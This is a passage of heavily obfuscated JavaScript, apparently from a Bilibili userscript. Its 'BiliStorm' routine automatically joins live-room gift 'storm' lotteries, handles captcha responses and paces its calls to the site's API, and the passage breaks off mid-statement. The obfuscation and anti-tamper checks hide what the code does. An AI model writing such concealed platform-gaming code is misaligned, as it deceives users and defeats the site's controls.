4\x6f\x41\x3d\x3d','\x63\x4d\x4b\x56\x77\x37\x56\x31\x77\x35\x55\x3d','\x77\x6f\x31\x2f\x59\x79\x46\x38','\x77\x6f\x44\x44\x70\x63\x4f\x64\x5a\x4d\x4b\x4d\x58\x73\x4f\x71\x77\x70\x6a\x43\x6f\x45\x48\x43\x72\x63\x4f\x53\x77\x6f\x4c\x44\x69\x51\x3d\x3d','\x77\x37\x74\x4c\x56\x7a\x30\x51','\x62\x38\x4f\x59\x77\x35\x73\x62\x4b\x77\x3d\x3d','\x65\x38\x4b\x41\x77\x34\x52\x53\x77\x36\x67\x4e','\x4f\x51\x76\x43\x67\x63\x4f\x6c\x54\x51\x3d\x3d','\x77\x70\x74\x4a\x53\x63\x4f\x63\x77\x72\x6b\x57\x61\x41\x3d\x3d','\x77\x35\x46\x51\x77\x34\x59\x73\x77\x71\x59\x3d','\x77\x37\x2f\x44\x76\x6e\x54\x43\x74\x38\x4f\x47','\x77\x72\x31\x79\x77\x36\x2f\x43\x69\x63\x4f\x4a','\x4f\x73\x4f\x54\x77\x70\x54\x44\x75\x42\x45\x3d','\x77\x71\x70\x44\x5a\x38\x4f\x6a\x77\x70\x30\x3d','\x77\x35\x6e\x43\x6e\x45\x5a\x61\x4a\x57\x76\x44\x73\x51\x30\x50\x77\x72\x63\x59\x77\x72\x50\x44\x67\x4d\x4f\x39','\x53\x38\x4b\x45\x58\x79\x6a\x43\x71\x6d\x6a\x43\x67\x38\x4b\x47\x77\x70\x6b\x54\x49\x52\x78\x55\x77\x72\x48\x43\x6d\x48\x54\x44\x71\x38\x4b\x4c\x77\x35\x2f\x43\x6d\x6c\x5a\x58','\x51\x48\x7a\x43\x76\x4d\x4b\x5a\x77\x37\x35\x71','\x4e\x38\x4b\x49\x77\x37\x37\x44\x68\x7a\x4d\x3d','\x77\x35\x48\x44\x75\x46\x7a\x43\x6f\x38\x4b\x32\x77\x35\x55\x3d','\x77\x36\x44\x44\x6d\x63\x4b\x51\x65\x4d\x4b\x37','\x5a\x6c\x6a\x43\x6d\x38\x4b\x6a\x4a\x67\x3d\x3d','\x77\x70\x45\x6d\x77\x72\x48\x43\x69\x73\x4b\x43\x77\x72\x50\x43\x6d\x38\x4f\x41\x45\x67\x3d\x3d','\x77\x34\x76\x43\x73\x48\x34\x3d','\x77\x72\x5a\x45\x63\x54\x70\x49\x77\x71\x4d\x65\x59\x63\x4b\x45','\x77\x70\x64\x54\x77\x37\x44\x43\x72\x4d\x4f\x6b\x77\x72\x63\x3d','\x64\x63\x4f\x6c\x44\x46\x78\x38','\x4c\x63\x4f\x77\x77\x72\x66\x44\x6f\x51\x4d\x3d','\x77\x34\x6a\x43\x67\x38\x4b\x35\x77\x36\x4c\x44\x70\x67\x3d\x3d','\x4c\x73\x4b\x6f\x54\x41\x4d\x75','\x77\x70\x35\x78\x53\x52\x45\x4b','\x77\x72\x35\x52\x77\x35\x58\x43\x68\x4d\x4f\x47','\x5a\x33\x44\x43\x69\x48\x64\x45','\x77\x6f\x73\x69\x42\x58\x45\x3d','\x77\x37\x77\x45\x59\x79\x6b\x59','\x77\x37\x72\x43\x67\x4d\x4b\x63\x77\x35\x7a\x44\x6c\x56\x6f\x3d','\x77\x35\x48\x44\x68\x31\x63\x3d','\x56\x4d\x4f\x4b\x4a\x56\x66\x43\x6a\x73\x4f\x6f\x47\x51\x3d\x3d','\x47\x63\x4f\x6b\x77\x72\x54\x44\x74\x41\x4d\x3d','\x63\x6b\x58\x43\x73\x32\x4e\x51','\x53\x4d\x4f\x66\x4b\x30\x52\x66','\x46\x42\x6e\x43\x70\x63\x4f\x4a\x53\x51\x3d\x3d','\x4b\x7a\x54\x43\x70\x73\x4b\x2b\x51\x73\x4b\x56\x57\x77\x73\x3d','\x64\x73\x4b\x69\x77\x34\x35\x4e\x77\x36\x73\x3d','\x44\x32\x6a\x44\x6a\x63\x4b\x78\x51\x51\x3d\x3d','\x55\x45\x66\x43\x6b\x47\x78\x78','\x77\x37\x6f\x68\x41\x63\x4b\x4d\x77\x34\x55\x3d','\x65\x63\x4b\x7a\x61\x67\x72\x43\x68\x6c\x6a\x43\x75\x63\x4b\x4a\x77\x72\x6b\x76\x42\x43\x6c\x66\x77\x6f\x59\x3d','\x51\x4d\x4f\x37\x45\x57\x4a\x30','\x63\x73\x4f\x44\x4f\x56\x70\x53\x58\x6c\x37\x43\x73\x77\x66\x44\x69\x38\x4f\x52\x61\x38\x4b\x31\x62\x41\x3d\x3d','\x77\x71\x50\x44\x67\x38\x4f\x32\x55\x4d\x4b\x73\x62\x38\x4f\x47','\x47\x73\x4f\x42\x52\x77\x3d\x3d','\x35\x62\x32\x79\x35\x70\x57\x79\x35\x62\x47\x79\x35\x62\x2b\x4f\x35\x62\x2b\x55\x35\x70\x53\x71\x36\x5a\x75\x48\x35\x61\x32\x76\x35\x71\x36\x41','\x61\x32\x50\x43\x6e\x73\x4b\x34\x77\x34\x34\x3d','\x4a\x63\x4f\x4d\x5a\x63\x4f\x7a\x43\x51\x3d\x3d','\x77\x34\x50\x44\x71\x63\x4b\x39\x65\x63\x4b\x79','\x48\x38\x4f\x47\x77\x72\x62\x44\x6c\x32\x4c\x43\x6a\x63\x4f\x51\x42\x41\x3d\x3d','\x58\x63\x4f\x58\x77\x35\x73\x79','\x77\x70\x34\x66\x77\x72\x44\x43\x6a\x63\x4b\x68','\x77\x36\x49\x56\x46\x38\x4b\x49\x77\x35\x59\x3d','\x57\x6c\x4c\x43\x6e\x63\x4b\x66\x4a\x38\x4b\x46','\x61\x4d\x4f\x67\x4f\x33\x4c\x43\x72\x38\x4b\x39\x45\x38\x4f\x41\x77\x36\x66\x43\x6d\x6b\x5a\x44\x4c\x63\x4b\x4f','\x58\x4d\x4f\x67\x77\x34\x67\x70\x62\x51\x3d\x3d','\x51\x38\x4b\x7a\x66\x43\x76\x43\x69\x77\x3d\x3d','\x77\x6f\x6f\x51\x77\x72\x44\x43\x74\x63\x4b\x70','\x50\x63\x4f\x51\x77\x70\x54\x44\x6d\x32\x6f\x3d','\x58\x63\x4f\x6c\x4b\x33\x37\x43\x75\x41\x3d\x3d','\x56\x4d\x4f\x5a\x77\x35\x59\x4b\x4a\x77\x3d\x3d','\x51\x38\x4f\x54\x49\x4d\x4b\x6c\x50\x77\x3d\x3d','\x64\x4d\x4b\x62\x46\x73\x4b\x72\x50\x47\x49\x3d','\x49\x4d\x4f\x58\x55\x63\x4f\x4e\x47\x67\x3d\x3d','\x77\x37\x37\x43\x6c\x38\x4f\x2f\x4c\x38\x4f\x6d','\x77\x34\x6c\x2b\x77\x36\x46\x61\x77\x34\x73\x59\x77\x34\x33\x44\x6a\x55\x6c\x49\x77\x35\x73\x3d','\x50\x6a\x73\x6a\x4e\x62\x46\x49\x52\x69\x55\x6b\x48\x5a\x42\x77\x61\x6d\x69\x43\x2e\x4f\x63\x6f\x6d\x2e\x76\x36\x3d\x3d'];(function(_0x1c335e,_0x483841,_0x1e8275){var _0x197a74=function(_0x4939f5,_0x17e50d,_0x1599c1,_0x473a82,_0x5a2627){_0x17e50d=_0x17e50d>>0x8,_0x5a2627='po';var _0x5e438a='shift',_0x30ccce='push';if(_0x17e50d<_0x4939f5){while(--_0x4939f5){_0x473a82=_0x1c335e[_0x5e438a]();if(_0x17e50d===_0x4939f5){_0x17e50d=_0x473a82;_0x1599c1=_0x1c335e[_0x5a2627+'p']();}else if(_0x17e50d&&_0x1599c1['replace'](/[PNbFIRUkHZBwCO=]/g,'')===_0x17e50d){_0x1c335e[_0x30ccce](_0x473a82);}}_0x1c335e[_0x30ccce](_0x1c335e[_0x5e438a]());}return 0x51d26;};var _0x4d815f=function(){var _0xe8178b={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0xd33cd0,_0x14e7e9,_0x2757c6,_0x1db849){_0x1db849=_0x1db849||{};var _0x397136=_0x14e7e9+'='+_0x2757c6;var _0x586948=0x0;for(var _0x586948=0x0,_0x5399d7=_0xd33cd0['length'];_0x586948<_0x5399d7;_0x586948++){var _0x21a0a2=_0xd33cd0[_0x586948];_0x397136+=';\x20'+_0x21a0a2;var _0x3b913c=_0xd33cd0[_0x21a0a2];_0xd33cd0['push'](_0x3b913c);_0x5399d7=_0xd33cd0['length'];if(_0x3b913c!==!![]){_0x397136+='='+_0x3b913c;}}_0x1db849['cookie']=_0x397136;},'removeCookie':function(){return'dev';},'getCookie':function(_0x1ce62b,_0x14f261){_0x1ce62b=_0x1ce62b||function(_0x124ee5){return _0x124ee5;};var _0x1bd276=_0x1ce62b(new RegExp('(?:^|;\x20)'+_0x14f261['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x2e451b=typeof _0xod1=='undefined'?'undefined':_0xod1,_0x585167=_0x2e451b['split'](''),_0x1c6d9c=_0x585167['length'],_0x293c4a=_0x1c6d9c-0xe,_0x2ce949;while(_0x2ce949=_0x585167['pop']()){_0x1c6d9c&&(_0x293c4a+=_0x2ce949['charCodeAt']());}var _0x2361fc=function(_0x224f84,_0x44b151,_0x43ea45){_0x224f84(++_0x44b151,_0x43ea45);};_0x293c4a^-_0x1c6d9c===-0x524&&(_0x2ce949=_0x293c4a)&&_0x2361fc(_0x197a74,_0x483841,_0x1e8275);return _0x2ce949>>0x2===0x14b&&_0x1bd276?decodeURIComponent(_0x1bd276[0x1]):undefined;}};var _0xf9847f=function(){var _0x5ef9c0=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x5ef9c0['test'](_0xe8178b['removeCookie']['toString']());};_0xe8178b['updateCookie']=_0xf9847f;var _0xceb2df='';var _0x2048bc=_0xe8178b['updateCookie']();if(!_0x2048bc){_0xe8178b['setCookie'](['*'],'counter',0x1);}else if(_0x2048bc){_0xceb2df=_0xe8178b['getCookie'](null,'counter');}else{_0xe8178b['removeCookie']();}};_0x4d815f();}(_0x4a67,0x159,0x15900));var _0x314c=function(_0x5abf38,_0x2fe9dd){_0x5abf38=~~'0x'['concat'](_0x5abf38);var _0x5134ea=_0x4a67[_0x5abf38];if(_0x314c['POXDsN']===undefined){(function(){var _0x27f84a=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x57990e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x27f84a['atob']||(_0x27f84a['atob']=function(_0x1cbcd2){var _0xeeabc7=String(_0x1cbcd2)['replace'](/=+$/,'');for(var _0x40ce15=0x0,_0x554943,_0x116e5f,_0x593c8d=0x0,_0x45b33e='';_0x116e5f=_0xeeabc7['charAt'](_0x593c8d++);~_0x116e5f&&(_0x554943=_0x40ce15%0x4?_0x554943*0x40+_0x116e5f:_0x116e5f,_0x40ce15++%0x4)?_0x45b33e+=String['fromCharCode'](0xff&_0x554943>>(-0x2*_0x40ce15&0x6)):0x0){_0x116e5f=_0x57990e['indexOf'](_0x116e5f);}return _0x45b33e;});}());var _0x2f530c=function(_0x5d3bd5,_0x2fe9dd){var _0x40a3b4=[],_0xacbefd=0x0,_0x1ac482,_0x5c267e='',_0x514c58='';_0x5d3bd5=atob(_0x5d3bd5);for(var _0x20d74a=0x0,_0x5e5e51=_0x5d3bd5['length'];_0x20d74a<_0x5e5e51;_0x20d74a++){_0x514c58+='%'+('00'+_0x5d3bd5['charCodeAt'](_0x20d74a)['toString'](0x10))['slice'](-0x2);}_0x5d3bd5=decodeURIComponent(_0x514c58);for(var _0x445cac=0x0;_0x445cac<0x100;_0x445cac++){_0x40a3b4[_0x445cac]=_0x445cac;}for(_0x445cac=0x0;_0x445cac<0x100;_0x445cac++){_0xacbefd=(_0xacbefd+_0x40a3b4[_0x445cac]+_0x2fe9dd['charCodeAt'](_0x445cac%_0x2fe9dd['length']))%0x100;_0x1ac482=_0x40a3b4[_0x445cac];_0x40a3b4[_0x445cac]=_0x40a3b4[_0xacbefd];_0x40a3b4[_0xacbefd]=_0x1ac482;}_0x445cac=0x0;_0xacbefd=0x0;for(var _0x21adba=0x0;_0x21adba<_0x5d3bd5['length'];_0x21adba++){_0x445cac=(_0x445cac+0x1)%0x100;_0xacbefd=(_0xacbefd+_0x40a3b4[_0x445cac])%0x100;_0x1ac482=_0x40a3b4[_0x445cac];_0x40a3b4[_0x445cac]=_0x40a3b4[_0xacbefd];_0x40a3b4[_0xacbefd]=_0x1ac482;_0x5c267e+=String['fromCharCode'](_0x5d3bd5['charCodeAt'](_0x21adba)^_0x40a3b4[(_0x40a3b4[_0x445cac]+_0x40a3b4[_0xacbefd])%0x100]);}return _0x5c267e;};_0x314c['wGSZQl']=_0x2f530c;_0x314c['kAveXP']={};_0x314c['POXDsN']=!![];}var _0x344598=_0x314c['kAveXP'][_0x5abf38];if(_0x344598===undefined){if(_0x314c['oGOcfA']===undefined){var _0x562a82=function(_0x24fcb2){this['ghlTCv']=_0x24fcb2;this['XAfzPZ']=[0x1,0x0,0x0];this['UGvSqa']=function(){return'newState';};this['FYNxMR']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['EktuOD']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x562a82['prototype']['SljLcc']=function(){var _0x4dcb59=new RegExp(this['FYNxMR']+this['EktuOD']);var _0x13146c=_0x4dcb59['test'](this['UGvSqa']['toString']())?--this['XAfzPZ'][0x1]:--this['XAfzPZ'][0x0];return this['kghKRO'](_0x13146c);};_0x562a82['prototype']['kghKRO']=function(_0x633f40){if(!Boolean(~_0x633f40)){return _0x633f40;}return this['gHofQA'](this['ghlTCv']);};_0x562a82['prototype']['gHofQA']=function(_0x148be8){for(var _0x4e33b8=0x0,_0xe010b6=this['XAfzPZ']['length'];_0x4e33b8<_0xe010b6;_0x4e33b8++){this['XAfzPZ']['push'](Math['round'](Math['random']()));_0xe010b6=this['XAfzPZ']['length'];}return _0x148be8(this['XAfzPZ'][0x0]);};new _0x562a82(_0x314c)['SljLcc']();_0x314c['oGOcfA']=!![];}_0x5134ea=_0x314c['wGSZQl'](_0x5134ea,_0x2fe9dd);_0x314c['kAveXP'][_0x5abf38]=_0x5134ea;}else{_0x5134ea=_0x344598;}return _0x5134ea;};var _0x28b916=function(){var _0x3f9602=!![];return function(_0x40c3b4,_0x3d39c1){var _0x370a53=_0x3f9602?function(){if(_0x3d39c1){var _0x3ee325=_0x3d39c1['apply'](_0x40c3b4,arguments);_0x3d39c1=null;return _0x3ee325;}}:function(){};_0x3f9602=![];return _0x370a53;};}();var _0x478924=_0x28b916(this,function(){var _0x177949=function(){return'\x64\x65\x76';},_0x5fa18b=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x49eed5=function(){var _0x48ff07=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x48ff07['\x74\x65\x73\x74'](_0x177949['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x78f839=function(){var _0x45eaaa=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x45eaaa['\x74\x65\x73\x74'](_0x5fa18b['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x27f8be=function(_0x452057){var _0x4fb8bd=~-0x1>>0x1+0xff%0x0;if(_0x452057['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x4fb8bd)){_0x19aeda(_0x452057);}};var _0x19aeda=function(_0x53c0f3){var _0x38f9f5=~-0x4>>0x1+0xff%0x0;if(_0x53c0f3['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x38f9f5){_0x27f8be(_0x53c0f3);}};if(!_0x49eed5()){if(!_0x78f839()){_0x27f8be('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x27f8be('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x27f8be('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x478924();class AWaitLock{constructor(){this[_0x314c('0','\x78\x44\x4a\x25')]=[];this[_0x314c('1','\x5d\x31\x73\x72')]=![];}async[_0x314c('2','\x23\x7a\x76\x4e')](){if(this[_0x314c('3','\x30\x28\x5b\x6e')]){let _0x29d85b=this;await new Promise(_0x43e212=>{_0x29d85b[_0x314c('4','\x46\x70\x7a\x61')][_0x314c('5','\x4a\x63\x71\x4b')](_0x43e212);});}this['\x6c\x6f\x63\x6b\x65\x64']=!![];return!![];}[_0x314c('6','\x66\x70\x46\x36')](){var _0x166a6d={'\x64\x43\x69\x53\x55':_0x314c('7','\x23\x4b\x40\x64'),'\x41\x56\x76\x5a\x44':function(_0x1393a1,_0x6b6412){return _0x1393a1===_0x6b6412;},'\x59\x49\x69\x72\x4d':'\x49\x6e\x4c\x59\x51','\x6e\x66\x6a\x4c\x43':function(_0x17a105){return _0x17a105();},'\x64\x72\x65\x44\x68':function(_0x193795,_0x316d87){return _0x193795==_0x316d87;}};let _0x2f37fd=this[_0x314c('8','\x4d\x75\x32\x25')][_0x314c('9','\x37\x41\x46\x30')]();if(_0x2f37fd){if(_0x166a6d[_0x314c('a','\x4a\x63\x71\x4b')](_0x166a6d[_0x314c('b','\x6d\x69\x5d\x58')],_0x166a6d['\x59\x49\x69\x72\x4d'])){_0x166a6d[_0x314c('c','\x30\x69\x67\x5d')](_0x2f37fd);}else{num_ongoing_calls+=0x1;Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('d','\x66\x70\x46\x36')](_0x166a6d[_0x314c('e','\x73\x6d\x59\x79')],adapter_pointer,[function_pointer,args]);Module[_0x314c('f','\x35\x44\x32\x4f')]['\x74\x6d\x70']=null;var _0x1a0a6b=Module[_0x314c('10','\x73\x6d\x59\x79')]['\x74\x6d\x70'];}}if(_0x166a6d[_0x314c('11','\x4a\x61\x48\x39')](this[_0x314c('12','\x41\x55\x44\x5a')]['\x6c\x65\x6e\x67\x74\x68'],0x0)){this[_0x314c('13','\x4b\x74\x36\x4b')]=![];}}}const BiliStorm={'\x6c\x6f\x63\x6b':new AWaitLock(),'\x73\x74\x6f\x72\x6d\x53\x65\x74':new Set(),'\x6a\x6f\x69\x6e':async(_0x2dc14d,_0x1c6c06,_0x26a531)=>{var _0x3cfc8e={'\x4f\x55\x6b\x42\x4f':'\x31\x34\x7c\x32\x7c\x31\x32\x7c\x37\x7c\x30\x7c\x31\x31\x7c\x31\x30\x7c\x31\x7c\x31\x33\x7c\x33\x7c\x39\x7c\x34\x7c\x36\x7c\x38\x7c\x35','\x75\x48\x74\x50\x76':function(_0x458f7c,_0x1db646){return _0x458f7c/_0x1db646;},'\x7a\x4f\x6d\x67\x50':function(_0x272846,_0x1dcd14,_0x21cc3f){return _0x272846(_0x1dcd14,_0x21cc3f);},'\x79\x4c\x4e\x69\x77':_0x314c('14','\x55\x25\x59\x55'),'\x4c\x6c\x4b\x61\x4e':function(_0x3abca8,_0x2c176c){return _0x3abca8&&_0x2c176c;},'\x62\x41\x6a\x43\x64':function(_0x4b7e81){return _0x4b7e81();},'\x44\x62\x58\x76\x7a':function(_0x530af0,_0x89773a){return _0x530af0(_0x89773a);},'\x64\x53\x51\x4e\x4f':function(_0x299f7a,_0x1f8f52){return _0x299f7a>_0x1f8f52;},'\x74\x53\x6e\x6b\x4c':function(_0x91449f,_0x178083){return _0x91449f>_0x178083;},'\x76\x71\x42\x62\x68':function(_0x234d6e,_0x45a094){return _0x234d6e===_0x45a094;},'\x70\x56\x54\x6b\x78':'\x41\x7a\x69\x58\x66','\x48\x62\x70\x55\x48':_0x314c('15','\x4d\x68\x38\x36'),'\x71\x64\x62\x72\x6f':_0x314c('16','\x23\x7a\x76\x4e'),'\x6f\x4c\x4a\x49\x79':_0x314c('17','\x4d\x75\x32\x25'),'\x55\x53\x69\x6f\x49':function(_0x2301b2,_0x1eae13){return _0x2301b2&&_0x1eae13;},'\x49\x4d\x48\x50\x52':function(_0x19efd6,_0x23cea7){return _0x19efd6!==_0x23cea7;},'\x75\x50\x45\x48\x45':_0x314c('18','\x66\x70\x46\x36'),'\x76\x4c\x43\x53\x68':_0x314c('19','\x39\x68\x72\x66'),'\x56\x70\x4e\x4c\x4f':function(_0x473d67,_0x4a97e3){return _0x473d67-_0x4a97e3;},'\x73\x68\x52\x59\x4c':function(_0x2896cf,_0x59dc43){return _0x2896cf+_0x59dc43;},'\x57\x48\x61\x72\x69':function(_0xb7bd8f,_0xce5d29){return _0xb7bd8f>_0xce5d29;},'\x41\x63\x72\x52\x52':function(_0x3d4aa1,_0x39e4d9,_0x4971a1){return _0x3d4aa1(_0x39e4d9,_0x4971a1);},'\x67\x73\x63\x52\x76':_0x314c('1a','\x35\x44\x32\x4f'),'\x54\x43\x51\x48\x44':function(_0x5bf72b,_0x152783){return _0x5bf72b!=_0x152783;},'\x4e\x51\x6d\x68\x66':'\u9a8c\u8bc1\u7801','\x49\x6d\x65\x77\x71':function(_0x20bfcf,_0x14a5e2){return _0x20bfcf==_0x14a5e2;},'\x58\x78\x4c\x4d\x49':function(_0x14969d,_0x4df46f){return _0x14969d!=_0x4df46f;},'\x44\x48\x6e\x61\x47':_0x314c('1b','\x62\x5e\x4a\x7a'),'\x4a\x46\x65\x50\x7a':function(_0x20d4da,_0x3cae98){return _0x20d4da==_0x3cae98;},'\x41\x63\x6a\x5a\x65':function(_0x70f78d,_0x4caab3){return _0x70f78d+_0x4caab3;},'\x47\x6e\x6d\x4f\x41':_0x314c('1c','\x30\x69\x67\x5d'),'\x6d\x63\x42\x68\x56':'\x66\x50\x4d\x6c\x6d','\x70\x6b\x6b\x73\x49':_0x314c('1d','\x49\x64\x79\x5a'),'\x66\x56\x6e\x57\x76':function(_0x5b41d7,_0xb40f22){return _0x5b41d7===_0xb40f22;},'\x75\x6a\x76\x44\x44':'\x64\x57\x57\x74\x76','\x54\x6c\x54\x6c\x62':'\x41\x6c\x72\x65\x61\x64\x79\x20\x64\x72\x6f\x70\x70\x65\x64\x20\x52\x75\x73\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x63\x61\x6c\x6c\x65\x64\x21','\x7a\x6d\x75\x46\x61':function(_0x491cf1,_0x1c1629){return _0x491cf1===_0x1c1629;},'\x4f\x57\x72\x74\x75':_0x314c('1e','\x6c\x4f\x4b\x49'),'\x64\x71\x4b\x56\x5a':_0x314c('1f','\x44\x41\x42\x61'),'\x52\x41\x6d\x6f\x68':'\x31\x34\x7c\x33\x7c\x39\x7c\x37\x7c\x35\x7c\x34\x7c\x36\x7c\x31\x33\x7c\x30\x7c\x31\x36\x7c\x38\x7c\x31\x32\x7c\x31\x31\x7c\x31\x35\x7c\x32\x7c\x31\x30\x7c\x31'};var _0x45fc30=_0x3cfc8e[_0x314c('20','\x54\x47\x31\x45')][_0x314c('21','\x30\x44\x72\x77')]('\x7c'),_0x266cb5=0x0;while(!![]){switch(_0x45fc30[_0x266cb5++]){case'\x30':var _0xfc1430=Math['\x72\x6f\x75\x6e\x64'](_0x3cfc8e[_0x314c('22','\x23\x7a\x76\x4e')](_0x2dc14d,0xf4240));continue;case'\x31':var _0x5dc7da=0x0;continue;case'\x32':_0x1c6c06=_0x3cfc8e['\x7a\x4f\x6d\x67\x50'](parseInt,_0x1c6c06,0xa);continue;case'\x33':var _0x4d4fd8=0x0;continue;case'\x34':window[_0x314c('23','\x30\x45\x2a\x43')](_0x314c('24','\x5d\x31\x73\x72')+_0x1c6c06+_0x314c('25','\x46\x70\x7a\x61')+_0x2dc14d+'\x29',_0x3cfc8e[_0x314c('26','\x39\x68\x72\x66')]);continue;case'\x35':return $[_0x314c('27','\x50\x29\x62\x6b')]()[_0x314c('28','\x5d\x31\x73\x72')]();case'\x36':if(_0x3cfc8e[_0x314c('29','\x4d\x68\x38\x36')](Token,TokenUtil)&&!Info[_0x314c('2a','\x44\x41\x42\x61')]&&CONFIG[_0x314c('2b','\x30\x28\x5b\x6e')][_0x314c('2c','\x5d\x31\x73\x72')][_0x314c('2d','\x33\x6a\x45\x23')]){await _0x3cfc8e['\x62\x41\x6a\x43\x64'](TokenLoad);}continue;case'\x37':if(_0x3cfc8e['\x44\x62\x58\x76\x7a'](isNaN,_0x1c6c06)||_0x3cfc8e[_0x314c('2e','\x23\x7a\x76\x4e')](isNaN,_0x2dc14d))return $[_0x314c('2f','\x64\x75\x43\x75')]()['\x72\x65\x6a\x65\x63\x74']();continue;case'\x38':while(!![]){try{var _0x33a1fd=Math['\x72\x6f\x75\x6e\x64'](_0x3cfc8e[_0x314c('30','\x30\x45\x2a\x43')](new Date()[_0x314c('31','\x73\x6d\x59\x79')](),0x3e8));if(_0x3cfc8e[_0x314c('32','\x78\x44\x4a\x25')](_0x33a1fd,_0x26a531)&&_0x3cfc8e['\x74\x53\x6e\x6b\x4c'](_0x26a531,0x0)){if(_0x3cfc8e[_0x314c('33','\x30\x69\x67\x5d')](_0x3cfc8e[_0x314c('34','\x64\x75\x43\x75')],_0x3cfc8e[_0x314c('35','\x23\x61\x70\x4b')])){window[_0x314c('36','\x6d\x69\x5d\x58')](_0x314c('37','\x58\x72\x51\x54')+_0x1c6c06+_0x314c('38','\x4a\x61\x48\x39')+_0x2dc14d+_0x314c('39','\x5e\x32\x37\x57')+_0x4d4fd8,_0x3cfc8e[_0x314c('3a','\x4d\x68\x38\x36')]);break;}else{if(_0x6428e0[_0x314c('3b','\x50\x29\x62\x6b')](kind,0xa)){throw new ReferenceError(_0x6428e0[_0x314c('3c','\x64\x75\x43\x75')]);}else if(_0x6428e0['\x59\x66\x51\x7a\x70'](kind,0xc)){throw new ReferenceError(_0x6428e0[_0x314c('3d','\x6c\x4f\x4b\x49')]);}else{throw new ReferenceError(_0x6428e0[_0x314c('3e','\x44\x41\x42\x61')]);}}}_0x4d4fd8++;let _0x14748c;try{await BiliStorm[_0x314c('3f','\x70\x48\x6e\x21')][_0x314c('40','\x54\x47\x31\x45')]();var _0x1dd387,_0x537c6f;try{if(_0x3cfc8e[_0x314c('41','\x6d\x69\x5d\x58')](_0x3cfc8e[_0x314c('42','\x45\x61\x5e\x30')],_0x3cfc8e[_0x314c('43','\x23\x7a\x39\x6a')])){len+=0x6;}else{if(_0x3cfc8e[_0x314c('44','\x23\x7a\x39\x6a')](Token,TokenUtil)&&Info[_0x314c('45','\x23\x7a\x76\x4e')]){_0x1dd387=new Date()[_0x314c('46','\x50\x29\x62\x6b')]();_0x14748c=await BiliPushUtils[_0x314c('47','\x23\x7a\x39\x6a')][_0x314c('48','\x73\x6d\x59\x79')][_0x314c('49','\x4d\x68\x38\x36')](_0x2dc14d,_0x1c6c06);_0x537c6f=new Date()['\x67\x65\x74\x54\x69\x6d\x65']();}else{if(_0x3cfc8e['\x49\x4d\x48\x50\x52'](_0x3cfc8e['\x75\x50\x45\x48\x45'],_0x3cfc8e[_0x314c('4a','\x50\x29\x62\x6b')])){_0x1dd387=new Date()['\x67\x65\x74\x54\x69\x6d\x65']();_0x14748c=await BiliPushUtils['\x41\x50\x49']['\x53\x74\x6f\x72\x6d'][_0x314c('4b','\x30\x69\x67\x5d')](_0x2dc14d,_0x1c6c06);_0x537c6f=new Date()['\x67\x65\x74\x54\x69\x6d\x65']();}else{var _0x5f1f8c=Module[_0x314c('4c','\x67\x35\x29\x58')]['\x61\x63\x71\x75\x69\x72\x65\x5f\x6a\x73\x5f\x72\x65\x66\x65\x72\x65\x6e\x63\x65'](t);Module[_0x314c('f','\x35\x44\x32\x4f')][_0x314c('4d','\x6d\x69\x5d\x58')](r,_0x5f1f8c);}}}}finally{var _0x2579a6=_0x3cfc8e[_0x314c('4e','\x6a\x65\x59\x59')](_0x3cfc8e['\x73\x68\x52\x59\x4c'](_0x1dd387,CONFIG['\x41\x55\x54\x4f\x5f\x4c\x4f\x54\x54\x45\x52\x59\x5f\x43\x4f\x4e\x46\x49\x47'][_0x314c('4f','\x44\x41\x42\x61')][_0x314c('50','\x54\x47\x31\x45')]),_0x537c6f);if(_0x3cfc8e[_0x314c('51','\x64\x75\x43\x75')](_0x2579a6,0x0)){await _0x3cfc8e[_0x314c('52','\x66\x70\x46\x36')](delayCall,()=>!![],_0x2579a6);}BiliStorm['\x6c\x6f\x63\x6b'][_0x314c('53','\x23\x7a\x39\x6a')]();}_0x3cfc8e['\x41\x63\x72\x52\x52'](DEBUG,_0x3cfc8e[_0x314c('54','\x4a\x63\x71\x4b')],_0x14748c);if(_0x14748c['\x63\x6f\x64\x65']){if(_0x3cfc8e['\x54\x43\x51\x48\x44'](_0x14748c[_0x314c('55','\x6a\x55\x53\x40')][_0x314c('56','\x64\x75\x43\x75')]('\u9886\u53d6'),-0x1)){window[_0x314c('57','\x33\x6a\x45\x23')]('\x5b\u81ea\u52a8\u62bd\u5956\x5d\x5b\u8282\u594f\u98ce\u66b4\x5d\u9886\u53d6\x28\x72\x6f\x6f\x6d\x69\x64\x3d'+_0x1c6c06+_0x314c('58','\x44\x41\x42\x61')+_0x2dc14d+_0x314c('59','\x68\x53\x76\x4a')+_0x3b2fae+_0x314c('5a','\x23\x7a\x76\x4e')+_0x14748c['\x6d\x73\x67']+_0x314c('5b','\x43\x5e\x40\x53')+_0x4d4fd8,_0x3cfc8e['\x79\x4c\x4e\x69\x77']);break;}if(_0x3cfc8e[_0x314c('5c','\x54\x47\x31\x45')](_0x14748c[_0x314c('5d','\x41\x55\x44\x5a')]['\x69\x6e\x64\x65\x78\x4f\x66'](_0x3cfc8e['\x4e\x51\x6